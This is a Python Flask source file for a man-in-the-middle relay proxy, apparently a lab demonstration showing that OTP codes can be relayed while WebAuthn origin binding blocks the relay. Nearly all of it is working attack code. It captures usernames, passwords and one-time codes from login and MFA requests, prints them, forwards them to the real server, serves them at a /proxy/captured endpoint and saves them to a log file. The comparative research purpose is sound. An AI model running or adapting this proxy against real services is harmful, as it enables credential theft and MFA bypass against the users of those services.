"""
MITM (Man-in-the-Middle) Relay Proxy Implementation
"""

from flask import Flask, request, jsonify, Response
import requests
import time
import json
from datetime import datetime
import threading

class MITMProxy:
    def __init__(self, target_url="http://localhost:5000", proxy_port=5001):
        self.target_url = target_url
        self.proxy_port = proxy_port
        self.app = Flask(__name__)
        
        # Storage for captured data
        self.captured_credentials = []
        self.captured_otp = []
        self.relay_logs = []
        self.relay_success_count = 0
        self.relay_failure_count = 0
        
        # Setup routes
        self.setup_routes()
    
    def setup_routes(self):
        """Setup proxy routes"""
        
        @self.app.route('/register', methods=['POST'])
        def proxy_register():
            return self.relay_request('/register', 'POST')
        
        @self.app.route('/login', methods=['POST'])
        def proxy_login():
            return self.relay_and_capture_login()
        
        @self.app.route('/mfa/verify', methods=['POST'])
        def proxy_mfa_verify():
            return self.relay_and_capture_otp()
        
        @self.app.route('/webauthn/register', methods=['POST'])
        def proxy_webauthn_register():
            return self.relay_webauthn_register()
        
        @self.app.route('/webauthn/authenticate', methods=['POST'])
        def proxy_webauthn_authenticate():
            return self.relay_webauthn_authenticate()
        
        @self.app.route('/proxy/stats', methods=['GET'])
        def get_stats():
            return jsonify(self.get_statistics())
        
        @self.app.route('/proxy/captured', methods=['GET'])
        def get_captured():
            return jsonify({
                'credentials': self.captured_credentials,
                'otp': self.captured_otp
            })
    
    def relay_request(self, endpoint, method='POST'):
        """
        Relay request to target server
        """
        start_time = time.time()
        
        try:
            data = request.get_json() if request.is_json else request.form.to_dict()
            
            # Forward to real server
            target = f"{self.target_url}{endpoint}"
            
            if method == 'POST':
                response = requests.post(target, json=data, timeout=5)
            else:
                response = requests.get(target, timeout=5)
            
            latency = (time.time() - start_time) * 1000  # ms
            
            # Log relay
            self.log_relay(endpoint, True, latency, data)
            
            return Response(
                response.content,
                status=response.status_code,
                content_type=response.headers.get('content-type')
            )
        
        except Exception as e:
            latency = (time.time() - start_time) * 1000
            self.log_relay(endpoint, False, latency, None, str(e))
            return jsonify({'error': 'Relay failed', 'message': str(e)}), 500
    
    def relay_and_capture_login(self):
        """
        Capture credentials and relay login request
        """
        start_time = time.time()
        data = request.get_json()
        
        # CAPTURE CREDENTIALS
        captured = {
            'timestamp': datetime.now().isoformat(),
            'username': data.get('username'),
            'password': data.get('password'),
            'captured_from': request.remote_addr
        }
        self.captured_credentials.append(captured)
        
        print(f"\n[MITM] Captured credentials:")
        print(f"  Username: {captured['username']}")
        print(f"  Password: {captured['password']}")
        
        # RELAY TO REAL SERVER
        try:
            response = requests.post(
                f"{self.target_url}/login",
                json=data,
                timeout=5
            )
            
            latency = (time.time() - start_time) * 1000
            self.log_relay('/login', True, latency, data, relay_type='credential_capture')
            
            print(f"  Relay: SUCCESS (latency: {latency:.2f}ms)")
            
            return Response(
                response.content,
                status=response.status_code,
                content_type=response.headers.get('content-type')
            )
        
        except Exception as e:
            latency = (time.time() - start_time) * 1000
            self.log_relay('/login', False, latency, data, str(e), 'credential_capture')
            print(f"  Relay: FAILED ({str(e)})")
            return jsonify({'error': 'Relay failed'}), 500
    
    def relay_and_capture_otp(self):
        """
        Capture OTP and relay to real server
        Demonstrates successful MITM attack on OTP
        """
        start_time = time.time()
        data = request.get_json()
        
        # CAPTURE OTP
        captured = {
            'timestamp': datetime.now().isoformat(),
            'username': data.get('username'),
            'otp': data.get('otp'),
            'otp_type': data.get('otp_type', 'TOTP'),
            'captured_from': request.remote_addr
        }
        self.captured_otp.append(captured)
        
        print(f"\n[MITM] Captured OTP:")
        print(f"  Username: {captured['username']}")
        print(f"  OTP: {captured['otp']}")
        print(f"  Type: {captured['otp_type']}")
        
        # RELAY TO REAL SERVER
        # This demonstrates that OTP can be captured and forwarded
        try:
            response = requests.post(
                f"{self.target_url}/mfa/verify",
                json=data,
                timeout=5
            )
            
            latency = (time.time() - start_time) * 1000
            self.log_relay('/mfa/verify', True, latency, data, relay_type='otp_relay')
            self.relay_success_count += 1
            
            print(f"  Relay: SUCCESS (latency: {latency:.2f}ms)")
            print(f"  [!] OTP RELAY ATTACK SUCCESSFUL - OTP was captured and forwarded!")
            
            return Response(
                response.content,
                status=response.status_code,
                content_type=response.headers.get('content-type')
            )
        
        except Exception as e:
            latency = (time.time() - start_time) * 1000
            self.log_relay('/mfa/verify', False, latency, data, str(e), 'otp_relay')
            self.relay_failure_count += 1
            print(f"  Relay: FAILED ({str(e)})")
            return jsonify({'error': 'Relay failed'}), 500
    
    def relay_webauthn_register(self):
        """
        Attempt to relay WebAuthn registration
        Will fail due to origin binding
        """
        start_time = time.time()
        data = request.get_json()
        
        print(f"\n[MITM] Attempting to relay WebAuthn registration:")
        print(f"  Username: {data.get('username')}")
        
        try:
            response = requests.post(
                f"{self.target_url}/webauthn/register",
                json=data,
                timeout=5
            )
            
            latency = (time.time() - start_time) * 1000
            
            # WebAuthn should fail due to origin mismatch
            if response.status_code == 200:
                print(f"  Relay: SUCCESS (unexpected!)")
                self.log_relay('/webauthn/register', True, latency, data, relay_type='webauthn')
            else:
                print(f"  Relay: FAILED - Origin binding prevented MITM attack ✓")
                self.log_relay('/webauthn/register', False, latency, data, 
                             'Origin mismatch', 'webauthn')
            
            return Response(
                response.content,
                status=response.status_code,
                content_type=response.headers.get('content-type')
            )
        
        except Exception as e:
            latency = (time.time() - start_time) * 1000
            self.log_relay('/webauthn/register', False, latency, data, str(e), 'webauthn')
            print(f"  Relay: FAILED ({str(e)})")
            return jsonify({'error': 'Relay failed'}), 500
    
    def relay_webauthn_authenticate(self):
        """
        Attempt to relay WebAuthn authentication
        Will fail due to origin binding
        """
        start_time = time.time()
        data = request.get_json()
        
        print(f"\n[MITM] Attempting to relay WebAuthn authentication:")
        print(f"  Username: {data.get('username')}")
        
        # Extract origin from client data if present
        client_data = data.get('clientData', '')
        print(f"  Client Origin: {self._extract_origin(client_data)}")
        print(f"  Expected Origin: {self.target_url}")
        
        try:
            response = requests.post(
                f"{self.target_url}/webauthn/authenticate",
                json=data,
                timeout=5
            )
            
            latency = (time.time() - start_time) * 1000
            
            # WebAuthn should fail due to origin mismatch
            if response.status_code == 200:
                print(f"  Relay: SUCCESS (unexpected!)")
                print(f"  [!] WARNING: WebAuthn relay should have failed!")
                self.log_relay('/webauthn/authenticate', True, latency, data, relay_type='webauthn')
                self.relay_success_count += 1
            else:
                print(f"  Relay: FAILED - Origin binding prevented MITM attack ✓")
                self.log_relay('/webauthn/authenticate', False, latency, data, 
                             'Origin mismatch', 'webauthn')
                self.relay_failure_count += 1
            
            return Response(
                response.content,
                status=response.status_code,
                content_type=response.headers.get('content-type')
            )
        
        except Exception as e:
            latency = (time.time() - start_time) * 1000
            self.log_relay('/webauthn/authenticate', False, latency, data, str(e), 'webauthn')
            self.relay_failure_count += 1
            print(f"  Relay: FAILED ({str(e)})")
            return jsonify({'error': 'Relay failed'}), 500
    
    def _extract_origin(self, client_data):
        """Extract origin from client data"""
        try:
            import base64
            decoded = base64.b64decode(client_data)
            data = json.loads(decoded)
            return data.get('origin', 'unknown')
        except:
            return 'unable to extract'
    
    def log_relay(self, endpoint, success, latency_ms, data=None, error=None, relay_type='generic'):
        """Log relay attempt"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'endpoint': endpoint,
            'success': success,
            'latency_ms': latency_ms,
            'relay_type': relay_type,
            'error': error
        }
        self.relay_logs.append(log_entry)
    
    def get_statistics(self):
        """Get proxy statistics"""
        total_relays = len(self.relay_logs)
        successful = sum(1 for log in self.relay_logs if log['success'])
        failed = total_relays - successful
        
        if total_relays > 0:
            avg_latency = sum(log['latency_ms'] for log in self.relay_logs) / total_relays
        else:
            avg_latency = 0
        
        # Breakdown by type
        otp_relays = [log for log in self.relay_logs if log['relay_type'] == 'otp_relay']
        webauthn_relays = [log for log in self.relay_logs if log['relay_type'] == 'webauthn']
        
        return {
            'total_relays': total_relays,
            'successful': successful,
            'failed': failed,
            'success_rate': f"{(successful/total_relays*100) if total_relays > 0 else 0:.2f}%",
            'average_latency_ms': f"{avg_latency:.2f}",
            'credentials_captured': len(self.captured_credentials),
            'otp_captured': len(self.captured_otp),
            'otp_relay_attempts': len(otp_relays),
            'otp_relay_success': sum(1 for log in otp_relays if log['success']),
            'webauthn_relay_attempts': len(webauthn_relays),
            'webauthn_relay_success': sum(1 for log in webauthn_relays if log['success']),
        }
    
    def save_logs(self, filename='mitm_logs.json'):
        """Save all logs to file"""
        logs = {
            'statistics': self.get_statistics(),
            'captured_credentials': self.captured_credentials,
            'captured_otp': self.captured_otp,
            'relay_logs': self.relay_logs
        }
        with open(filename, 'w') as f:
            json.dump(logs, f, indent=2)
        print(f"\nLogs saved to: {filename}")
    
    def run(self):
        """Start the MITM proxy server"""
        print(f"\n=== MITM Proxy Server ===")
        print(f"Proxy running on: http://localhost:{self.proxy_port}")
        print(f"Target server: {self.target_url}")
        print(f"Ready to capture and relay traffic...\n")
        
        self.app.run(host='0.0.0.0', port=self.proxy_port, debug=False)


# Demonstration
if __name__ == "__main__":
    print("=== MITM Relay Proxy Demonstration ===\n")
    
    print("This proxy demonstrates:")
    print("1. Credential capture from login requests")
    print("2. OTP relay attacks (TOTP/HOTP can be captured and forwarded)")
    print("3. WebAuthn protection (origin binding prevents relay)")
    print("\nKey Findings:")
    print("- OTP (TOTP/HOTP): Vulnerable to MITM relay attacks")
    print("- WebAuthn: Protected by origin binding - relay attacks fail")
    print("-" * 70)
    
    proxy = MITMProxy(target_url="http://localhost:5000", proxy_port=5001)
    
    # Run in separate thread to allow demonstration
    print("\nTo test the proxy:")
    print("1. Ensure the real API is running on port 5000")
    print("2. Send requests to proxy at http://localhost:5001")
    print("3. Check captured data at http://localhost:5001/proxy/captured")
    print("4. View statistics at http://localhost:5001/proxy/stats")
    print("\nStarting proxy server...\n")
    
    try:
        proxy.run()
    except KeyboardInterrupt:
        print("\n\nShutting down proxy...")
        proxy.save_logs()
        print("=== Test Complete ===")
